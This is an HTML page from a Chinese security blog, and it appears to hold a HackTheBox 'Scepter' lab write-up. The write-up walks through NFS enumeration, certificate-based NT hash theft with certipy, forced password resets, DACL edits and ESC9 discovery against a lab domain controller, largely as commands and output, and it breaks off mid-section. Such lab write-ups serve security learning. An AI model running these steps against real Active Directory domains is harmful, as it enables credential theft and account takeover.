<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/ef713f45b0b41153.css" as="style"/><script>
              (function() {
                try {
                  // 读取用户保存的主题偏好
                  const savedTheme = localStorage.getItem('theme');
                  
                  // 检测系统主题偏好
                  const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                  
                  // 判断是否应该使用暗黑模式
                  const shouldUseDark = savedTheme === 'dark' || (!savedTheme && systemPrefersDark);
                  
                  // 立即应用暗黑模式（在页面渲染前）
                  if (shouldUseDark) {
                    document.documentElement.classList.add('dark');
                  }
                } catch (e) {
                  // 静默处理错误，避免阻塞页面加载
                  console.error('Theme initialization error:', e);
                }
              })();
            </script><link rel="stylesheet" href="/_next/static/css/ef713f45b0b41153.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-f21970b4881df644.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/796-34c17833b03faf26.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-200c8fb703c11799.js" defer=""></script><script src="/_next/static/rYHkFZPcHeH30wRPpLsoD/_buildManifest.js" defer=""></script><script src="/_next/static/rYHkFZPcHeH30wRPpLsoD/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackTheBoxMachine - Scepter","contentHtml":"\u003ch1\u003eMachine - Scepterl\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://app.hackthebox.com/machines/Scepter\"\u003ehttps://app.hackthebox.com/machines/Scepter\u003c/a\u003e | \u003ccode\u003eHard\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003ePS：一直以为 Season 过了之后就不能白嫖靶机了…导致错过了两周的靶机…呜呜呜\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter nmap -sT -min-rate 10000 -p- 10.10.11.65        \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-24 10:18 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.65\nHost is up (0.30s latency).\nNot shown: 65306 filtered tcp ports (no-response), 224 closed tcp ports (conn-refused)\nPORT    STATE SERVICE\n53/tcp  open  domain\n111/tcp open  rpcbind\n135/tcp open  msrpc\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 66.89 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eWindows\u003c/code\u003e 靶机的端口，但不一定是域控主机（PS:后面才知道我扫描出来的端口shao）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter nmap -sT -A -T4 -O -p 53,111,135,139,445 10.10.11.65\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.65\nHost is up (0.40s latency).\n\nPORT    STATE SERVICE       VERSION\n53/tcp  open  domain        Simple DNS Plus\n111/tcp open  rpcbind?\n| rpcinfo:\n|   program version    port/proto  service\n|   100003  2,3         2049/udp6  nfs\n|   100003  2,3,4       2049/tcp6  nfs\n|   100003  4           2049/tcp   nfs\n|   100005  1,2,3       2049/tcp   mountd\n|   100005  1,2,3       2049/tcp6  mountd\n|   100005  1,2,3       2049/udp   mountd\n|   100005  1,2,3       2049/udp6  mountd\n|   100021  1,2,3,4     2049/tcp   nlockmgr\n|   100021  1,2,3,4     2049/tcp6  nlockmgr\n|   100021  1,2,3,4     2049/udp   nlockmgr\n|   100021  1,2,3,4     2049/udp6  nlockmgr\n|   100024  1           2049/tcp   status\n|   100024  1           2049/tcp6  status\n|   100024  1           2049/udp   status\n|_  100024  1           2049/udp6  status\n135/tcp open  msrpc         Microsoft Windows RPC\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds?\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Micro\nsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 143\n93 (91%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-04-24T22:05:35\n|_  start_date: N/A\n|_clock-skew: 7h40m16s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   464.44 ms 10.10.16.1\n2   291.53 ms 10.10.11.65\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 251.59 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eNFS\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003erpcdump.py scepter.htb -target-ip 10.10.11.65\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e很多的信息，尝试从里面获取有用的信息，结果保存在 \u003ccode\u003erpcdump_resule.txt\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e主机为 \u003ccode\u003eDC01.scepter.htb\u003c/code\u003e ，那就能确定是域控了\u003c/p\u003e\n\u003cp\u003eNMAP 中扫描出了靶机开启了 NFS，尝试一下匿名访问。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter showmount -e 10.10.11.65\nExport list \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.65:\n/helpdesk (everyone)\n\n➜  Scepter \u003cspan class=\"hljs-built_in\"\u003emkdir\u003c/span\u003e nfs\n➜  Scepter \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e mount -t nfs 10.10.11.65:/helpdesk /root/Desktop/test/Scepter/nfs\n\n➜  Scepter \u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e nfs   \n➜  nfs \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\nbaker.crt  baker.key  clark.pfx  lewis.pfx  scott.pfx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eTo D.baker\u003c/h2\u003e\n\u003cp\u003e使用 openssl 查看 \u003ccode\u003ebaker.crt\u003c/code\u003e 的内容\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  nfs_backup openssl x509 -\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e baker.crt -text -noout\nCertificate:                                                                                                                                                                                                    \n    Data:                                 \n        Version: 3 (0x2)                                                                                                                                                                                        \n        Serial Number:            \n            62:00:00:00:32:e1:a5:c3:91:51:31:09:7b:00:00:00:00:00:32\n        Signature Algorithm: sha256WithRSAEncryption \n        Issuer: DC=htb, DC=scepter, CN=scepter-DC01-CA\n        Validity                       \n            Not Before: Nov  2 01:13:46 2024 GMT                                                        \n            Not After : Nov  2 01:13:46 2025 GMT\n        Subject: DC=htb, DC=scepter, CN=Users, CN=d.baker, emailAddress=d.baker@scepter.htb\n        Subject Public Key Info:         \n            Public Key Algorithm: rsaEncryption\n                Public-Key: (2048 bit)                                         \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e尝试生成 \u003ccode\u003epfx\u003c/code\u003e 文件，用于认证的密码是 \u003ccode\u003enewpassword\u003c/code\u003e （暂时不知道如何获得，弱密码？），新设置密码为空密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  nfs_backup openssl pkcs12 -\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e -out baker.pfx -inkey baker.key -\u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e baker.crt\nEnter pass phrase \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e baker.key:\nEnter Export Password:\nVerifying - Enter Export Password:\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过 \u003ccode\u003ecertipy-ad\u003c/code\u003e 提取用户 hash\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e ntpdate 10.10.11.65 | certipy-ad auth -pfx baker.pfx -dc-ip 10.10.11.65 -domain scepter.htb -username d.baker\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: d.baker@scepter.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to \u003cspan class=\"hljs-string\"\u003e'd.baker.ccache'\u003c/span\u003e\n[*] Trying to retrieve NT \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'd.baker'\u003c/span\u003e\n[*] Got \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'd.baker@scepter.htb'\u003c/span\u003e: aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eaad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e检查密码有效性\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter nxc smb 10.10.11.65 -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce\nSMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.65     445    DC01             [+] scepter.htb\\d.baker:18b5fb0d99e7a475316213c15b6f22ce \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter nxc ldap 10.10.11.65 -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce\nSMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.65     389    DC01             [+] scepter.htb\\d.baker:18b5fb0d99e7a475316213c15b6f22ce \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter bloodhound-python -u \u003cspan class=\"hljs-string\"\u003e'd.baker'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e'scepter.htb'\u003c/span\u003e -ns 10.10.11.65 --zip -c All -dc \u003cspan class=\"hljs-string\"\u003e'DC01.scepter.htb'\u003c/span\u003e --hashes \u003cspan class=\"hljs-string\"\u003e'aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce'\u003c/span\u003e   \nINFO: Found AD domain: scepter.htb\nINFO: Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes\nINFO: Connecting to LDAP server: DC01.scepter.htb\nINFO: Found 1 domains\nINFO: Found 1 domains \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.scepter.htb\nINFO: Found 11 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nINFO: Found 57 \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e\nINFO: Found 2 gpos\nINFO: Found 3 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: dc01.scepter.htb\nWARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.\nINFO: Done \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 00M 27S\nINFO: Compressing output into 20250425062047_bloodhound.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eTo A.carter\u003c/h2\u003e\n\u003ch3\u003e权限滥用\u003c/h3\u003e\n\u003cp\u003eBloodHound分析，\u003ccode\u003ed.baker\u003c/code\u003e 属于 \u003ccode\u003eSTAFF ACCESS CERTICICATE\u003c/code\u003e 的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Scepter/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e因为这个关系，\u003ccode\u003ed.baker\u003c/code\u003e 可以修改 \u003ccode\u003ea.carter\u003c/code\u003e 的密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Scepter/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e修改密码 \u003ccode\u003e123456\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  nfs_backup changepasswd.py \u003cspan class=\"hljs-string\"\u003e'scepter.htb/a.carter@10.10.11.65'\u003c/span\u003e -newpass 123456 -altuser \u003cspan class=\"hljs-string\"\u003e'd.baker'\u003c/span\u003e -althash \u003cspan class=\"hljs-string\"\u003e'aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce'\u003c/span\u003e -reset\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Setting the password of scepter.htb\\a.carter as scepter.htb\\d.baker\n[*] Connecting to DCE/RPC as scepter.htb\\d.baker\n[*] Password was changed successfully.\n[!] User no longer has valid AES keys \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e Kerberos, \u003cspan class=\"hljs-keyword\"\u003euntil\u003c/span\u003e they change their password again.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e检验是否修改成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  nfs_backup nxc smb 10.10.11.65 -u a.carter -p 123456       \nSMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.65     445    DC01             [+] scepter.htb\\a.carter:123456 \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eTo H.brown\u003c/h2\u003e\n\u003cp\u003e通过 BloodHound 查看一下 a.carter 的权限。对 \u003ccode\u003eSTAFF ACCESS CERTIFICATE\u003c/code\u003e 有 GenericAll 权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Scepter/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e赋予 a.carter 对\u003ccode\u003eSTAFF ACCESS CERTIFICATE\u003c/code\u003e  \u003ccode\u003eFullcontrol\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  nfs_backup dacledit.py -action \u003cspan class=\"hljs-string\"\u003e'write'\u003c/span\u003e -rights \u003cspan class=\"hljs-string\"\u003e'FullControl'\u003c/span\u003e -inheritance -principal \u003cspan class=\"hljs-string\"\u003e'a.carter'\u003c/span\u003e -target-dn \u003cspan class=\"hljs-string\"\u003e'OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'scepter.htb'\u003c/span\u003e/\u003cspan class=\"hljs-string\"\u003e'a.carter'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'123456'\u003c/span\u003e\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU\n[*] DACL backed up to dacledit-20250425-071815.bak\n[*] DACL modified successfully!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter bloodhound-python -u \u003cspan class=\"hljs-string\"\u003e'a.carter'\u003c/span\u003e -p \u003cspan class=\"hljs-string\"\u003e'123456'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e'scepter.htb'\u003c/span\u003e -ns 10.10.11.65 --zip -c All -dc \u003cspan class=\"hljs-string\"\u003e'DC01.scepter.htb'\u003c/span\u003e \nINFO: Found AD domain: scepter.htb\nINFO: Getting TGT \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes\nINFO: Connecting to LDAP server: DC01.scepter.htb\nINFO: Found 1 domains\nINFO: Found 1 domains \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.scepter.htb\nINFO: Found 11 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\nINFO: Found 57 \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e\nINFO: Found 2 gpos\nINFO: Found 3 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: dc01.scepter.htb\nINFO: Done \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 00M 31S\nINFO: Compressing output into 20250425071924_bloodhound.zip\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e粗略一看没找到链子，先找找下一个目标账户，查看了用户后发现 \u003ccode\u003eh.brown\u003c/code\u003e 是远程管理组成员，暂且将其作为目标用户。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Scepter/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eESC9\u003c/h3\u003e\n\u003cp\u003e一开始给我们提供的就是证书来获得用户，所以知识点可能在 AD CS\u003c/p\u003e\n\u003cp\u003e使用 certipy 收集数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Scepter certipy-ad find -u a.carter@scepter.htb -p 123456 -dc-ip 10.10.11.65 -bloodhound                                                                                     \nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Finding certificate templates\n[*] Found 35 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 13 enabled certificate templates\n[*] Trying to get CA configuration \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'scepter-DC01-CA'\u003c/span\u003e via CSRA\n[!] Got error \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e trying to get CA configuration \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'scepter-DC01-CA'\u003c/span\u003e via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\n[*] Trying to get CA configuration \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'scepter-DC01-CA'\u003c/span\u003e via RRP\n[!] Got error \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e trying to get CA configuration \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'scepter-DC01-CA'\u003c/span\u003e via RRP: The NETBIOS connection with the remote host timed out.\n[!] Failed to get CA configuration \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'scepter-DC01-CA'\u003c/span\u003e\n[*] Saved BloodHound data to \u003cspan class=\"hljs-string\"\u003e'20250425111914_Certipy.zip'\u003c/span\u003e. Drag and drop the file into the BloodHound GUI from @ly4k\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eESC4 也有，但是我们当前的用户无法实现。最后发现 \u003ccode\u003eESC9\u003c/code\u003e 貌似是我们当前可以利用的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxMachine%20-%20Scepter/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e利用链接：\u003ca href=\"https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension\"\u003ehttps://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e该组织属性：\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e属性\u003c/th\u003e\n\u003cth\u003e值\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003eAny Purpose\u003c/td\u003e\n\u003ctd\u003eFalse\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003eAuthorized Signatures 